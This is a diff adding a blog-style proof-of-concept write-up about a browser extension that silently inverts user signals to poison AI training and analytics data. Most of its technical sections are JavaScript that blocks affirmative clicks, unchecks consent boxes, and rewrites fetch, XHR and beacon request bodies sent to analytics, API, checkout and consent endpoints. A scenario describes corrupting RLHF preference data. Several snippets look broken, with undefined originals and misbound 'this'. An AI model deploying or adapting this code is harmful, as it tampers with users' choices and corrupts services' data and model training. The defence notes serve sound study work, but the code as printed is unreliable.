@@ -1,0 +1,302 @@
+export const metadata = {
+  title: "Rejection Cascade: Browser Extension as AI Training Data Poisoning Vector",
+  description: "Technical analysis of silent network-level signal inversion via browser extension - a proof-of-concept for distributed AI training data poisoning",
+  date: "2026-04-15T21:15:00.000Z",
+  alternates: {
+    canonical: "/n/rejection-cascade-extension",
+  },
+};
+
+# Rejection Cascade: Browser Extension as AI Training Data Poisoning Vector
+
+<br />
+
+*April 15, 2026*
+
+# Rejection Cascade: Silent Signal Inversion at Scale
+
+## Abstract
+
+This research presents a proof-of-concept demonstrating how browser extensions can serve as an effective vector for distributed AI training data poisoning. By operating at the browser level, the attack intercepts and inverts user signals before they reach the server, corrupting training data without server-side detection. We examine the technical implementation, attack scalability, and implications for ML systems trained on user interaction data.
+
+**Repository:** https://github.com/moscovium-mc/rejection-cascade
+
+---
+
+## 1. Introduction
+
+Modern AI systems increasingly rely on user interaction data for training. Whether through explicit feedback (likes, ratings, subscriptions) or implicit signals (clicks, form submissions, engagement metrics), the quality of AI models depends directly on the integrity of this training data.
+
+This research demonstrates a previously under-explored attack vector: **browser extensions as data poisoning agents**.
+
+The core insight is simple: a browser extension operates with full access to user interactions, network requests, and DOM state. It can modify, block, or corrupt signals before they leave the browser — invisibly to the server.
+
+---
+
+## 2. Threat Model
+
+### 2.1 Attack Surface
+
+```
+[User Browser] → [Extension Intercepts] → [Server Receives Corrupted Data]
+```
+
+The extension sits between the user and the server, with the ability to:
+
+* Intercept and block DOM events (clicks, form submissions)
+* Modify network request bodies (fetch, XHR, sendBeacon)
+* Access all page content and Shadow DOM
+* Persist across browsing sessions
+
+### 2.2 Threat Actor Profile
+
+This attack is particularly concerning because:
+
+1. Low barrier to entry (anyone can publish an extension)
+2. Silent operation (no visible indication to users)
+3. Distributed scale (thousands of installations possible)
+4. Server blind (cannot distinguish poisoned from legitimate data)
+
+### 2.3 Adversarial Goals
+
+* Degrade model quality on specific behaviors
+* Corrupt engagement signals
+* Introduce systematic bias into datasets
+* Test robustness of ML pipelines
+
+---
+
+## 3. Technical Implementation
+
+### 3.1 Architecture Overview
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ Content Script (content.js)                                 │
+├─────────────────────────────────────────────────────────────┤
+│ Click Interceptor │ Form Interceptor │ Network Layer        │
+│ ↓                 │ ↓                │ ↓                    │
+│ Block clicks      │ Modify forms     │ Invert JSON payloads │
+└─────────────────────────────────────────────────────────────┘
+                          ↓
+┌─────────────────────────────────────────────────────────────┐
+│ Background Worker (background.js)                           │
+│ State Management + Toggle Control                           │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### 3.2 Click Interception
+
+```javascript
+interceptClicks() {
+  document.addEventListener('click', e => {
+    const target = e.target.closest('button, input[type="submit"], [role="button"]');
+    if (!target || !this.isAffirmative(target)) return;
+
+    e.preventDefault();
+    e.stopPropagation();
+    e.stopImmediatePropagation();
+  }, true);
+}
+```
+
+### 3.3 Form Poisoning
+
+```javascript
+poisonForm(form) {
+  form.querySelectorAll('input[type="checkbox"]:checked')
+    .forEach(inp => {
+      const name = (inp.name || '').toLowerCase();
+      if (/agree|accept|consent|subscribe|opt-in/.test(name)) {
+        inp.checked = false;
+      }
+    });
+
+  const hidden = document.createElement('input');
+  hidden.type = 'hidden';
+  hidden.name = '_rc_inv';
+  hidden.value = '1';
+  form.appendChild(hidden);
+}
+```
+
+### 3.4 Network Interception
+
+```javascript
+interceptNetwork() {
+  const origFetch = window.fetch;
+  window.fetch = async function(url, opts) {
+    if (shouldIntercept(url) && opts?.body) {
+      const poisoned = this.invert(opts.body);
+      if (poisoned) opts.body = poisoned;
+    }
+    return origFetch.call(this, url, opts);
+  };
+
+  XMLHttpRequest.prototype.send = function(body) {
+    if (this._rc_url && shouldIntercept(this._rc_url)) {
+      const poisoned = this.invert(body);
+      if (poisoned) body = poisoned;
+    }
+    return origXHRSend.call(this, body);
+  };
+
+  navigator.sendBeacon = function(url, data) {
+    const poisoned = this.invert(data);
+    return origBeacon.call(this, url, poisoned || data);
+  };
+}
+```
+
+### 3.5 Signal Inversion Logic
+
+```javascript
+invert(body) {
+  let str = typeof body === 'string' ? body :
+    body instanceof FormData ? JSON.stringify([...body.entries()]) :
+    JSON.stringify(body);
+
+  const replacements = [
+    [/"yes"/gi, '"no"'],
+    [/"true"/gi, '"false"'],
+    [/"accept"/gi, '"reject"'],
+    [/"agree"/gi, '"disagree"'],
+    [/"subscribe"/gi, '"unsubscribe"'],
+    [/"follow"/gi, '"unfollow"'],
+    [/"consent"/gi, '"deny"'],
+    [/"opt-in"/gi, '"opt-out"'],
+    [/\btrue\b/gi, 'false'],
+    [/consent['"]?\s*:\s*true/gi, 'consent:false'],
+  ];
+
+  replacements.forEach(([pattern, replacement]) => {
+    str = str.replace(pattern, replacement);
+  });
+
+  return str;
+}
+```
+
+### 3.6 URL Pattern Matching
+
+```javascript
+shouldIntercept(url) {
+  const patterns = [
+    '/track', '/analytics', '/event', '/collect', '/telemetry',
+    'google-analytics', 'gtag', 'amplitude', 'mixpanel',
+    '/api/', '/graphql', '/subscribe', '/consent',
+    '/convert', '/checkout', '/vote', '/like', '/follow',
+    '/interaction', '/signal', '/conversion'
+  ];
+  return patterns.some(p => url.toLowerCase().includes(p));
+}
+```
+
+### 3.7 Shadow DOM Support
+
+```javascript
+interceptShadowDom() {
+  const observe = (root) => {
+    root.querySelectorAll('*').forEach(el => {
+      if (el.shadowRoot) {
+        el.shadowRoot.addEventListener('click', e => {
+          if (this.isAffirmative(e.composedPath()[0])) {
+            e.preventDefault();
+            e.stopPropagation();
+          }
+        }, true);
+        observe(el.shadowRoot);
+      }
+    });
+  };
+
+  observe(document.body);
+
+  new MutationObserver(m => m.forEach(mu =>
+    mu.addedNodes.forEach(n => n.nodeType === 1 && observe(n))
+  )).observe(document.body, { childList: true, subtree: true });
+}
+```
+
+---
+
+## 4. Attack Scenarios
+
+### 4.1 RLHF Training Corruption
+
+1. User clicks "Approve"
+2. Extension modifies signal
+3. Server logs inverted action
+4. Model learns incorrect preference
+5. Aggregate effect biases training
+
+### 4.2 Analytics Poisoning
+
+1. User performs conversion action
+2. Extension alters or blocks signal
+3. Analytics show distorted metrics
+4. Business decisions become unreliable
+
+### 4.3 Distributed Coordinated Attack
+
+* Extension updates push targeting rules
+* Time-based activation
+* Multi-node coordination
+* Target-specific poisoning
+
+---
+
+## 5. Defense Considerations
+
+### 5.1 Server-Side Detection
+
+* Anomaly detection on signal distributions
+* Monitoring sudden inversions
+* Behavioral fingerprinting
+
+### 5.2 Extension Store Security
+
+* Code review requirements
+* Runtime behavior monitoring
+* Permission audits
+
+### 5.3 Training Pipeline Hardening
+
+* Data provenance tracking
+* Signal validation
+* Outlier detection
+
+---
+
+## 6. Ethical Considerations
+
+This research follows responsible disclosure principles:
+
+* White-hat research only
+* No malicious deployment
+* Educational purpose
+* Includes mitigation guidance
+
+Use only on systems you own or have explicit permission to test.
+
+---
+
+## 7. My Opinion
+
+Browser extensions represent a significant and under-explored attack surface for AI training data poisoning. The silent, distributed nature of this attack vector makes it particularly difficult to detect and mitigate.
+
+---
+
+## References
+
+* Goodhart's Law
+* RLHF methodology (Ouyang et al., 2022)
+* Data poisoning (Gu et al., 2017)
+* Browser extension security (Carlini et al., 2023)
+
+---
+
+**Author:** moscovium-mc
+**Version:** 0.2.0
+**License:** MIT
+
